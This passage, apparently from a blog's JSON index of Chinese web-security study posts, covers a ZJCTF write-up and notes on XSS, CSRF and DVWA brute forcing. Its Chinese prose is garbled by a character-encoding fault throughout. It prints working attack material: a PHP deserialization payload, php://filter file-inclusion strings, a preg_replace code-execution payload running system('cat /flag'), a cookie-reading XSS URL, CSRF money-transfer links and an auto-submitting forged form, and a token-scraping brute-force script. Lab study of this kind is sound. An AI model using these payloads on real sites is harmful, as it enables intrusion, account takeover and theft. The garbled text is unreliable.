å‘ç°classæ–°å»ºç±»ï¼Œå®¡è®¡å‘ç°æ˜¯ç”¨file_get_contents()è¯»å–$fileï¼Œé‚£ä¹ˆæˆ‘ä»¬æ„å»ºååºåˆ—åŒ–ï¼š 123456789101112131415161718&lt;?php class Flag&#123; //flag.php public $file=&quot;flag.php&quot;; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; $a=new Flag;echo urlencode(serialize($a));?&gt; password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; æœ€åæˆ‘ä»¬æ•´åˆpayloadï¼Œæ‰“å¼€f12ï¼Œå¾—åˆ°flagï¼š 1?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤æ˜¾ç¤ºä»£ç å®¡è®¡ï¼š 123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; ç”¨php://inputæˆ–è€…dataä¼ªåè®®ç»•è¿‡file_get_contents()ï¼Œå‘ç°æ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨php://filterè¯»å–ï¼Œæ„å»ºpayloadï¼š 1?file=php://filter/read=convert.base64-encode/resource=next.php&amp;text=data://text/plain,I have a dream æ¥ç€è¯»å–next.phpä¸­çš„æºç ï¼š 1234567891011121314151617181920&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123; return preg_replace( &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $str );&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123; @eval($_GET[&#x27;cmd&#x27;]);&#125; è¿™é‡Œæˆ‘ä»¬è¦ç»•è¿‡preg_replace()æ¥è¯»å–getFlag()å‡½æ•°ï¼Œç»•è¿‡æ–¹æ³•å¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢ï¼šPreg_Replaceä»£ç æ‰§è¡Œæ¼æ´è§£æ é€šè¿‡é‚£ç¯‡åšå®¢æä¾›çš„æ€è·¯ï¼Œæˆ‘ä»¬æ„å»ºpayloadï¼š 1234/next.php?\\S*=$&#123;getflag()&#125;&amp;cmd=system(&#x27;ls /&#x27;);/next.php?\\S*=$&#123;getflag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);flag&#123;86010810-34fc-4e22-ae9c-3efaf2b0ffe3&#125; system(&#x27;cat /flag&#x27;);","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"XSSå­¦ä¹ ","slug":"XSSå­¦ä¹ ","date":"2021-12-16T07:47:22.000Z","updated":"2021-12-16T12:34:45.443Z","comments":true,"path":"2021/12/16/XSSå­¦ä¹ /","link":"","permalink":"http://example.com/2021/12/16/XSS%E5%AD%A6%E4%B9%A0/","excerpt":"å‰è¨€XSSå¯ä»¥è¯´æ˜¯ç›¸å½“ç¹æ‚ï¼Œä½†ä¹Ÿç›¸å½“é‡è¦ã€‚XSSçš„æ”»å‡»æ–¹å¼å¤šæ ·ï¼Œæ‰‹æ®µæ›´æ˜¯é˜²ä¸èƒœé˜²ï¼Œæ˜¯DVWAä¸­çš„é‡ç‚¹å­¦ä¹ æ¨¡å—ã€‚","text":"å‰è¨€XSSå¯ä»¥è¯´æ˜¯ç›¸å½“ç¹æ‚ï¼Œä½†ä¹Ÿç›¸å½“é‡è¦ã€‚XSSçš„æ”»å‡»æ–¹å¼å¤šæ ·ï¼Œæ‰‹æ®µæ›´æ˜¯é˜²ä¸èƒœé˜²ï¼Œæ˜¯DVWAä¸­çš„é‡ç‚¹å­¦ä¹ æ¨¡å—ã€‚ å…³äºXSSXSSç®€ä»‹XSSï¼ˆCross Site Scriptingï¼‰ï¼Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œä¸ºäº†ä¸å±‚å æ ·å¼è¡¨ï¼ˆCascading Style Sheetsï¼Œç®€ç§°CSSï¼‰åšå‡ºåŒºåˆ†ï¼Œæ•…ç®€ç§°ä¸ºXSSã€‚XSSå’ŒSQLæ³¨å…¥æœ‰ä¸€å®šçš„ç›¸ä¼¼æ€§ï¼Œè¿™ä¸¤è€…éƒ½æ˜¯ç”±äºåå°ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥çš„ä¸ä¸¥æ ¼è¿‡æ»¤å¯¼è‡´çš„ï¼Œä½†æ˜¯XSSå¯ä»¥ä¸ä¸æ•°æ®åº“äº¤äº’ï¼Œè€Œæ˜¯ç›´æ¥å¯¹ç½‘é¡µä»£ç è¿›è¡Œæ”»å‡»æ¸—é€ã€‚ XSSåŸç†é»‘å®¢å°†æ¶æ„JSä»£ç æ’å…¥è¿›webä¸­ï¼Œå½“ç”¨æˆ·æµè§ˆè¿™ä¸ªç½‘é¡µæ—¶ï¼Œæ¶æ„JSä»£ç è¢«æ‰§è¡Œï¼Œè¾¾åˆ°é»‘å®¢çš„ç›®çš„ã€‚ ä¾‹å¦‚åœ¨ä¸€ä¸ªç•™è¨€æ¿ä¸­ï¼Œæˆ‘ä»¬å°†&lt;script&gt;alert(&quot;Heyï¼ŒHacker!&quot;)&lt;/script&gt;å†™å…¥ï¼Œé‚£ä¹ˆæ­¤æ—¶é¡µé¢çš„htmlä»£ç ä¸­å°†ä¼šæŠŠè¿™æ®µè¯æ’å…¥è¿›å»ï¼Œé‚£ä¹ˆç•™è¨€æ¿ä¸Šçš„ä»£ç å°±å˜æˆäº†ï¼š 123&lt;div id=â€boardâ€ &lt;script&gt;alert(&quot;Heyï¼ŒHacker!&quot;)&lt;/script&gt;&lt;/div&gt; è¿™æ—¶å¦‚æœæœ‰ç”¨æˆ·æ‰“å¼€è¿™ä¸ªç•™è¨€æ¿ï¼Œé‚£ä¹ˆæµè§ˆå™¨è§£æhtmlï¼Œè¿™æ—¶æˆ‘ä»¬å†™å…¥çš„JSè¯­å¥å°±ä¼šè¢«æ‰§è¡Œï¼Œç”¨æˆ·çš„ç½‘é¡µä¸Šå°±ä¼šå¼¹å‡ºå†™ç€â€Heyï¼ŒHacker!â€çš„å¼¹çª—ã€‚ XSSè„šæœ¬æ³¨å…¥ç‚¹æ—¢ç„¶è¯´åˆ°XSSä¸SQLæ³¨å…¥æ˜¯ç›¸ä¼¼çš„ï¼Œé‚£ä¹ˆXSSä¹Ÿä¸€å®šæ˜¯å­˜åœ¨æ³¨å…¥ç‚¹çš„ï¼Œä¸‹é¢ç®€å•ä»‹ç»å‡ ä¸ªå¸¸ç”¨æ³¨å…¥ç‚¹ï¼š HTMLæ ‡ç­¾ä¹‹é—´&lt;div&gt;ï¼šå¯ä»¥ç›´æ¥å†™å…¥JSï¼Œwebä¼šç›´æ¥æ‰§è¡Œ&lt;title&gt;``&lt;iframe&gt;ç­‰åŒ…å«htmlEncodeåŠŸèƒ½çš„æ ‡ç­¾ï¼šå…ˆé—­åˆæ ‡ç­¾ï¼Œå†å†™å…¥JS HTMLæ ‡ç­¾ä¹‹å†…æ’å…¥ç‚¹åœ¨valueå†…ï¼Œtypeä¸ä¸ºhiddenï¼šç”±äºwebä¸ä¼šæ‰§è¡Œåœ¨valueå€¼å†…çš„JSä»£ç ï¼Œå› æ­¤è¦ä½¿JSä»Valueä¸­è·³å‡ºã€‚å¯ä»¥é‡‡ç”¨é—­åˆæ ‡ç­¾ç­‰å¤šç§æ–¹æ³•ã€‚æ’å…¥ç‚¹åœ¨valueå†…ï¼Œtypeä¸ºhiddenï¼šç”±äºæ ‡ç­¾å†…å®¹ä¸å¯æ˜¾ç¤ºï¼Œè¿™æ—¶å¯ä»¥é—­åˆæ ‡ç­¾æˆ–è€…æ’å…¥æ–°çš„typeï¼ˆæœ‰ä¸¤ä¸ªç›¸åŒtypeæ—¶ç¬¬äºŒä¸ªå¤±æ•ˆï¼‰ã€‚ å…¶å®ƒæƒ…å†µå±æ€§å¯æ‰§è¡Œä¼ªåè®®ï¼šç›´æ¥è¾“å…¥JavaScript:è„šæœ¬å†…å®¹eval()ï¼šä¼šç›´æ¥æ‰§è¡ŒJSè¯­å¥ï¼Œå› æ­¤å¯ä»¥ç›´æ¥è¾“å…¥è„šæœ¬å†…å®¹åœ¨JSä»£ç ä¸­æ’å…¥ï¼šé—­åˆæ ‡ç­¾æˆ–è€…å±æ€§ XSSçš„å±å®³XSSå¯ä»¥çªƒå–ç”¨æˆ·æ­£åœ¨æµè§ˆä¸­çš„cookieï¼Œå¯ä»¥åŠ«æŒæµé‡é€ æˆæ¶æ„é¡µé¢è·³è½¬ã€‚cookieå¦‚æœè¢«çªƒå–ï¼Œå¯èƒ½ä½ çš„éªŒè¯ä¿¡æ¯å°±ä¼šè¢«ç»•è¿‡ï¼Œè€Œé¡µé¢è·³è½¬ç»“åˆCSRFæ›´ä¼šé€ æˆæå¤§çš„å±å®³ã€‚ XSSæ”»å‡»æŒ‰ç…§æ”»å‡»çš„å½¢å¼ï¼ŒXSSè¢«åˆ†ä¸ºä¸‰ç±»ï¼šåå°„å‹XSSã€å‚¨å­˜å‹XSSä»¥åŠåŸºäºDOMçš„XSSã€‚ åå°„å‹XSSåå°„å‹XSSæ˜¯æŠŠæ¶æ„JSè„šæœ¬é€šè¿‡URLä¼ é€’ç»™æœåŠ¡å™¨ï¼Œè€ŒæœåŠ¡å™¨è‹¥æ²¡æœ‰è¿›è¡Œè¿‡æ»¤çš„è¯ï¼Œåˆ™ä¼šæŠŠJSè„šæœ¬åå°„ç»™ç”¨æˆ·ä½¿å¾—ç”¨æˆ·çš„æµè§ˆå™¨æ‰§è¡Œäº†æ¶æ„JSè„šæœ¬ã€‚ä¾‹å¦‚æ„å»ºurlè¿›è¡Œåå°„å‹XSSæ¥çªƒå–cookieä¸­çš„å†…å®¹ï¼š 1http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E# å‚¨å­˜å‹XSSå‚¨å­˜å‹XSSçš„å±å®³æ˜¯æå¤§çš„ï¼Œç”±äºæ¶æ„JSè„šæœ¬å¯èƒ½è¢«å­˜å…¥æ•°æ®åº“ä¸­æˆ–è¢«ä»¥å…¶ä»–æ–¹å¼å‚¨å­˜è¿›æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæ— è®ºæ˜¯è°åªè¦å†æ¬¡è®¿é—®è¯¥ç½‘é¡µï¼Œéƒ½æœ‰å¯èƒ½æ‰§è¡Œè¿™æ®µæ¶æ„JSè„šæœ¬ã€‚ å‰æ–‡æœ‰æåˆ°çš„ç•™è¨€æ¿å°±æ˜¯å‚¨å­˜å‹XSSçš„ç»å…¸ä¾‹å­ä¹‹ä¸€ï¼Œé™¤æ­¤ä»¥å¤–è¿˜æœ‰è¿˜æœ‰ç”¨æˆ·è¯„è®ºã€èŠå¤©ç§ä¿¡ç­‰ã€‚å¯¹æ¯”ä¸åå°„å‹XSSï¼Œå‚¨å­˜å‹XSSä¸éœ€è¦ç”¨æˆ·è®¿é—®ç‰¹å®šURLï¼Œåªè¦ç”¨æˆ·è®¿é—®æ¶æ„ç½‘é¡µå°±å¯ä»¥äº†ã€‚ åŸºäºDOMçš„XSSDOMï¼ˆDocument Object Modelï¼‰ï¼Œæ–‡æ¡£å¯¹è±¡æ¨¡å‹ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è±¡æ ‘æ¥è®¤è¯†DOMï¼šè€Œé€šè¿‡è¿™ä¸ªå¯¹è±¡æ¨¡å‹ï¼ŒJSå¯ä»¥è·å¾—åˆ›å»ºåŠ¨æ€HTMLçš„æƒåˆ©ã€‚è¿™ä¹Ÿä¸ºXSSåˆ›é€ äº†æ¡ä»¶ã€‚ åŸºäºDOMçš„XSSä¸€èˆ¬ä¸ä¼šä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œè¿™ä¸ªæ¼æ´æ˜¯ç”±äºå‰ç«¯çš„JSä»£ç ä¸ä¸¥è°¨é€ æˆçš„ï¼Œè¯»å–ã€æ‰§è¡Œæ¶æ„JSä»£ç åªç”±æµè§ˆå™¨å®Œæˆã€‚ æ€»ç»“å…³äºXSSçš„ç†è®ºå­¦ä¹ æš‚æ—¶å°±è¿™ä¹ˆå¤šäº†ï¼Œç†è®ºå­¦ä¹ æ˜¯ä¸€å®šè¦è¿ç”¨åˆ°å®è·µä¸Šçš„ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å®ŒæˆDVWAçš„ä¸‰ä¸ªXSSçš„å®æˆ˜ç»ƒä¹ äº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -XSS","slug":"web-XSS","permalink":"http://example.com/tags/web-XSS/"}]},{"title":"CSRFçš„å­¦ä¹ ","slug":"CSRFçš„å­¦ä¹ ","date":"2021-12-09T11:54:33.000Z","updated":"2021-12-09T14:49:35.714Z","comments":true,"path":"2021/12/09/CSRFçš„å­¦ä¹ /","link":"","permalink":"http://example.com/2021/12/09/CSRF%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"å‰è¨€åšDVWAé¦–å…ˆé‡åˆ°çš„ç¬¬ä¸€ä¸ªæ–°çŸ¥è¯†ç‚¹å°±æ˜¯CSRFäº†ï¼Œé‡åˆ°äº†é‚£å­¦å°±å®Œäº‹äº†ï¼Œå¤šå­¦å¤šç»ƒå¤šè®°è‚¯å®šæ˜¯æ²¡é”™çš„ã€‚","text":"å‰è¨€åšDVWAé¦–å…ˆé‡åˆ°çš„ç¬¬ä¸€ä¸ªæ–°çŸ¥è¯†ç‚¹å°±æ˜¯CSRFäº†ï¼Œé‡åˆ°äº†é‚£å­¦å°±å®Œäº‹äº†ï¼Œå¤šå­¦å¤šç»ƒå¤šè®°è‚¯å®šæ˜¯æ²¡é”™çš„ã€‚ ä»€ä¹ˆæ˜¯CSRFCSRFï¼ˆCross-site request forgeryï¼‰ï¼Œå³è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œç¼©å†™ä¸ºCSRFæˆ–è€…XSRFã€‚ ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½è¿›è¡Œå„ç§æ“ä½œã€‚å…·ä½“æµç¨‹å¯ä»¥å‚è€ƒä¸‹å›¾ï¼š æ”»å‡»è€…é€šè¿‡ä¼ªé€ æµè§ˆå™¨è¯·æ±‚ï¼Œå‘ç”¨æˆ·ä¹‹å‰æ›¾å–å¾—ä¿¡ä»»çš„ç½‘ç«™ï¼ˆå³åœ¨æœ¬åœ°ç”Ÿæˆäº†cookieï¼Œä¸”å¿…é¡»åœ¨åŒä¸€æµè§ˆå™¨ä¸‹ï¼‰å‘é€æ­¤è¯·æ±‚ï¼Œå¯¼è‡´ç½‘ç«™æ¥å—å¹¶è®¤ä¸ºæ˜¯ç”¨æˆ·çš„æ“ä½œè€Œæ‰§è¡Œå‘½ä»¤ã€‚è¿™ä¸ªæ¼æ´å¸¸å¸¸è¢«ç”¨æ¥ç›—å·ã€è½¬è´¦ã€å‘é€è™šå‡ä¿¡æ¯ç­‰ç­‰ï¼Œåˆ©ç”¨çš„æ˜¯ç½‘ç«™åªèƒ½éªŒè¯æ¥æºç”¨æˆ·çš„æµè§ˆå™¨ï¼Œå´ä¸èƒ½è®¤è¯æ˜¯å¦ä¸ºçœŸå®è¯¥ç”¨æˆ·è¿›è¡Œçš„æ“ä½œã€‚ å¦‚ä½•æ£€æµ‹CSRFæ¼æ´çš„å­˜åœ¨åœ¨ä¸å­˜åœ¨tokençš„å‰æä¸‹ï¼Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“åŒ…ååˆ å»è¯·æ±‚å¤´ä¸­çš„Refererå†æ¬¡æäº¤ï¼Œå¦‚æœæäº¤ä»ç„¶æœ‰æ•ˆåˆ™è¯´æ˜å¾ˆå¤§å¯èƒ½å­˜åœ¨CSRFæ¼æ´ã€‚ å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨CSRFTesterã€CSRF-Request-Builderç­‰å·¥å…·è¿›è¡Œæ£€æµ‹ç”šè‡³æ”»å‡»ï¼Œå…³äºè¿™å·¥å…·çš„ä½¿ç”¨ä¸å…·ä½“ä»‹ç»ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„åšå®¢è¿›è¡Œå­¦ä¹ ï¼šCSRFè‡ªåŠ¨åŒ–æµ‹è¯•-CSRFTester åˆ©ç”¨CSRFæ¼æ´è¿›è¡Œæ”»å‡»GETä¸REQUESTå¦‚æœæµè§ˆå™¨æ˜¯ä»¥GETæ–¹å¼æˆ–REQUESTæ–¹å¼æ¥æ”¶è¯·æ±‚çš„è¯ï¼Œå¹¶ä¸”æˆ‘ä»¬äº†è§£å…·ä½“æ“ä½œçš„payloadï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨è‡ªå·±æ­å»ºçš„æ¶æ„ç½‘ç«™ä¸­æ„å»ºä¸€ä¸ªç›¸ä¼¼çš„ä¿¡æ¯ã€‚ ä¾‹å¦‚ï¼ŒæŸç½‘ç«™çš„è½¬è´¦æ“ä½œæ˜¯è¿™æ ·çš„ï¼š 12http://www.mrl64.com/Transfercount?id=2333&amp;money=1000&amp;for=2233//å°†2333è´¦æˆ·ä¸­çš„1000å…ƒè½¬å…¥2233çš„è´¦æˆ·ä¸­ é‚£ä¹ˆæˆ‘å°±å¯ä»¥åœ¨æ¶æ„ç½‘ç«™ä¸­æ„é€ å†™å…¥ä¸€ä¸ªç±»ä¼¼çš„é“¾æ¥ï¼Œå°†è½¬è´¦çš„ç›®æ ‡è´¦æˆ·å†™æˆæˆ‘çš„è´¦æˆ·ï¼š 1http://www.mrl64.com/Transfercount?id=2333&amp;money=1000&amp;for=mrl64 æ¥ç€æˆ‘ä»¬æŠŠè¿™ä¸ªé“¾æ¥éšè—åœ¨æˆ‘ä»¬çš„ç½‘é¡µä¸­ï¼Œä¸€èˆ¬é‡‡ç”¨å›¾ç‰‡éšè—ï¼š 1&lt;img src=&#x27;http://www.mrl64.com/Transfercount?id=2333&amp;money=1000&amp;for=mrl64&#x27;&gt; è¿™æ—¶ï¼Œåªè¦ç”¨æˆ·çš„å®¢æˆ·ç«¯å®Œæˆäº†www.mrl64.comçš„éªŒè¯ç™»å½•å¹¶ä¿å­˜äº†è¯¥ç½‘ç«™çš„cookieï¼Œæˆ‘ä»¬å°±å¯ä»¥è¯±å¯¼ç”¨æˆ·è¿›å…¥æˆ‘ä»¬çš„æ¶æ„ç½‘ç«™ï¼ˆå®¢æˆ·ç«¯tabå¦ä¸€é¡µé¢ï¼‰ï¼Œè¿™æ—¶æˆ‘ä»¬æ„å»ºçš„é“¾æ¥å°±ä¼šè¿ç€cookieè¢«å‘é€åˆ°www.mrl64.comä¸­ï¼Œé“¾æ¥å¦‚æœè¢«ç½‘ç«™æˆåŠŸå“åº”ï¼Œé‚£ä¹ˆ2333è´¦æˆ·ä¸­çš„1000å…ƒå°±ä¼šè½¬å…¥æˆ‘ä»¬çš„å¸ä¸­ã€‚ è€Œç”±äº_REQUEST[]åŒæ ·ä¹Ÿå¯ä»¥æ¥æ”¶ä»¥GETè¯·æ±‚å‘é€çš„æ•°æ®ï¼Œå› æ­¤ä¸Šè¿°çš„æ”»å‡»æ–¹æ³•åŒæ ·å¥æ•ˆã€‚ POSTPOSTç±»å‹çš„CSRFä½¿ç”¨é€šå¸¸è¦ç”¨åˆ°è‡ªåŠ¨æäº¤çš„è¡¨å•ï¼Œè®¿é—®æ¶æ„ç½‘ç«™åè¡¨å•è‡ªåŠ¨æäº¤æ¨¡æ‹Ÿç”¨æˆ·è¿›è¡Œä¸€æ¬¡POSTã€‚ å†™è¡¨å•å°±éœ€è¦ç”¨åˆ°JSäº†ï¼Œä¼ªé€ ä¸€ä»½è·Ÿè½¬è´¦è¡¨å•ä¸€æ¨¡ä¸€æ ·çš„è¡¨å•ï¼Œç„¶ååµŒå…¥åˆ°iframeä¸­ï¼š 123456789101112131415161718192021&lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot;&gt; function steal() &#123; iframe = document.frames[&quot;steal&quot;]; iframe.document.Submit(&quot;transfer&quot;); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload=&quot;steal()&quot;&gt; &lt;iframe name=&quot;steal&quot; display=&quot;none&quot;&gt; &lt;form method=&quot;POST&quot; name=&quot;Transfercountr&quot; action=&quot;http://www.mrl64.com/Transfercount.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;2333&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;for&quot; value=&quot;mrl64&quot;&gt; &lt;/form&gt; &lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; å¤§æ¦‚å°±åƒè¿™æ ·ã€‚ è¯¦ç»†çš„æ”»å‡»æ–¹æ³•è¿˜å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡åšå®¢ï¼šCSRF æ€»ç»“CSRFæ¼æ´å®é™…åœºæ™¯ä¸­ä½¿ç”¨é¢‘ç‡è¾ƒä½ï¼Œä½†å±å®³æ€§æå¤§ï¼Œç›¸å½“å®¹æ˜“é€ æˆå¤§å‹ç½‘ç»œå®‰å…¨äº‹ä»¶ã€‚CSRFæ¼æ´è¿˜å¯ä»¥æ­é…XSSæ¼æ´è¿›è¡Œæ›´éšè”½çš„æ”»å‡»ï¼Œå› æ­¤CSRFæ¼æ´è¢«åˆ¤ä¸ºé«˜å±æ¼æ´ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -CSRF","slug":"web-CSRF","permalink":"http://example.com/tags/web-CSRF/"}]},{"title":"DVWAç»ƒä¹ ","slug":"DVWAç»ƒä¹ ","date":"2021-12-08T12:43:20.000Z","updated":"2021-12-19T11:57:34.451Z","comments":true,"path":"2021/12/08/DVWAç»ƒä¹ /","link":"","permalink":"http://example.com/2021/12/08/DVWA%E7%BB%83%E4%B9%A0/","excerpt":"å‰è¨€ç²—ç•¥å­¦ä¹ è¿‡httpåè®®çš„ç›¸å…³å†…å®¹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åˆ·é¶åœºçš„ç¯èŠ‚äº†ã€‚DVWAæ¶µç›–äº†å¤šç§å¸¸è§çš„webæ¼æ´ä¾›æˆ‘ä»¬ç»ƒä¹ ï¼Œç»¼åˆæ€§è¾ƒå¼ºã€‚","text":"å‰è¨€ç²—ç•¥å­¦ä¹ è¿‡httpåè®®çš„ç›¸å…³å†…å®¹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åˆ·é¶åœºçš„ç¯èŠ‚äº†ã€‚DVWAæ¶µç›–äº†å¤šç§å¸¸è§çš„webæ¼æ´ä¾›æˆ‘ä»¬ç»ƒä¹ ï¼Œç»¼åˆæ€§è¾ƒå¼ºã€‚ Brute Forcelowæ ¹æ®é¢˜ç›®çš„æ„æ€ï¼Œè¿™é¢˜çš„è€ƒç‚¹ä¸ºæš´åŠ›ç ´è§£ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†usernameè®¾ç½®ä¸ºadminï¼Œæ¥ç€ä½¿ç”¨burp suiteçš„å­—å…¸çˆ†ç ´åŠŸèƒ½çˆ†ç ´å‡ºå¯†ç å°±å¯ä»¥äº†ã€‚ æˆ–è€…æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°ï¼Œåç«¯å¯¹passwordè¿›è¡Œäº†md5åŠ å¯†ï¼Œä½†æ˜¯å¯¹usernameæ²¡æœ‰è¿›è¡Œé˜²å¾¡ï¼Œå› æ­¤æˆ‘ä»¬åœ¨usernameéƒ¨åˆ†è¿›è¡Œsqlæ³¨å…¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ mediumè¿™æ¬¡åœ¨æºç ä¸­usernameå’Œpasswordéƒ½ä½¿ç”¨äº†mysqli_real_escape_string()å‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œå› æ­¤sqlæ³¨å…¥å˜å¾—ç›¸å½“å›°éš¾ã€‚ ä¸è¿‡ç”±äºæ²¡æœ‰éªŒè¯cookieç­‰å¤´æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬ä»ç„¶å¯ä»¥è¿›è¡Œå­—å…¸çˆ†ç ´ã€‚ high123if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); åœ¨highéš¾åº¦ä¸‹åŠ å…¥äº†anti-csrfæ¥éšæœºè·å–tokenï¼Œå¹¶ä¸”åœ¨æ¯ä¸€æ¬¡ç™»å½•æ—¶éƒ½è¦å¯¹tokenè¿›è¡Œæ£€æŸ¥ï¼Œå› æ­¤ç›´æ¥è¿›è¡Œå­—å…¸çˆ†ç ´æ˜¯æ— æ³•è§£å¼€è¿™é¢˜çš„,è¿™é‡Œæˆ‘ä»¬å¯¹Intruderè¿›è¡Œè®¾ç½®ï¼š é¦–å…ˆå°†è¯·æ±‚å¤´å‘é€è‡³Intruderä¸­ï¼Œè®¾ç½®å¥½æˆ‘ä»¬è¦è¿›è¡Œçˆ†ç ´çš„å†…å®¹ä¸ºpasswordä¸user_tokenï¼Œå¹¶ä¸”å°†æ”»å‡»ç±»å‹è®¾ç½®ä¸ºPitchforkã€‚ æ¥ç€åœ¨Optionsä¸­æ‰¾åˆ°Grep-Extractï¼Œé€‰æ‹©Addï¼Œå…ˆç‚¹å‡»ä¸€æ¬¡Refetch responseï¼Œæ¥ç€å†å¤åˆ¶ä¸‹é¢è¿”å›ä¸­çš„user_tokençš„å€¼ï¼Œç‚¹å‡»okä¿å­˜ã€‚ ç„¶åå›åˆ°Payloadï¼ŒPayload seté¦–å…ˆä¸º1ï¼Œè®¾ç½®æˆ‘ä»¬è¦ç”¨æ¥çˆ†ç ´çš„å­—å…¸ï¼Œå†å°†Payload setè®¾ä¸º2ï¼Œé€‰æ‹©Recursive grepï¼Œå¹¶è¿›è¡Œè®¾ç½®ï¼š è®¾ç½®å®Œä¹‹åå°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†ï¼Œå¦‚æœå‡ºç°æŠ¥é”™æé†’å¯ä»¥å»æ£€æŸ¥è®¾ç½®çš„çº¿ç¨‹æ˜¯å¦ä¸º1ï¼Œå¦‚æœä¸ä¸º1åˆ™å°†çº¿ç¨‹æ”¹ä¸º1ï¼Œæœ€åæ•ˆæœï¼š å½“ç„¶è¿™é¢˜é€šè¿‡ç¼–å†™pythonè„šæœ¬ä¹Ÿå¯ä»¥è§£å‡ºï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªè„šæœ¬å¯¹æˆ‘æ¥è¯´è¿˜æ˜¯å¤æ‚äº†ï¼Œå°±å…ˆè´´ä¸€ä¸ªç½‘ä¸Šçš„ï¼š 12345678910111213141516171819202122232425262728293031from bs4 import BeautifulSoupimport requests header=&#123;&#x27;Host&#x27;:&#x27;127.0.0.1&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;, &#x27;Accept&#x27;:&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;, &#x27;Accept-Language&#x27;:&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;, &#x27;Referer&#x27;:&#x27;http://127.0.0.1/vulnerabilities/brute/&#x27;, &#x27;cookie&#x27;:&#x27;PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high&#x27;, &#x27;Connection&#x27;:&#x27;close&#x27;, &#x27;Upgrade-Insecure-Requests&#x27;:&#x27;1&#x27; &#125;requrl=&quot;http://127.0.0.1/vulnerabilities/brute/&quot; def get_token(requrl,header): response=requests.get(url=requrl,headers=header) print (response.status_code,len(response.content)) soup=BeautifulSoup(response.text,&quot;html.parser&quot;) input=soup.form.select(&quot;input[type=&#x27;hidden&#x27;]&quot;) #è¿”å›çš„æ˜¯ä¸€ä¸ªliståˆ—è¡¨ user_token=input[0][&#x27;value&#x27;] #è·å–ç”¨æˆ·çš„token return user_token user_token=get_token(requrl,header)i=0for line in open(&quot;E:\\Password\\mima.txt&quot;): requrl=&quot;http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i=i+1 print 